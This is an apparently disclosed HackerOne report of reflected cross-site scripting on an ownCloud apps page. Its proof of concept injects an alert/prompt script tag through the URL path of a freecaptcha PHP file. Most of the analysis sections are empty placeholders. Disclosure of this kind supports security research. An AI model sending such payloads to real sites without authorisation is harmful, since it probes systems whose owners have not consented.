---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '129551'
original_report_id: '129551'
title: Cross site scripting in apps.owncloud.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: owncloud
created_at: '2016-04-09T21:17:25.633Z'
disclosed_at: '2016-04-12T21:27:16.999Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Cross site scripting in apps.owncloud.com

## Metadata

- HackerOne Report ID: 129551
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: owncloud
- Disclosed At: 2016-04-12T21:27:16.999Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Vulenrablity Affects : http://apps.owncloud.com/lib/freecaptcha/freecap_wrap.php

POC : 

URI was set to :  "><script>alert(1)</script>

url : http://apps.owncloud.com/lib/freecaptcha/freecap_wrap.php/"><script>prompt(1)</script>

Screenshot : enclosed

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
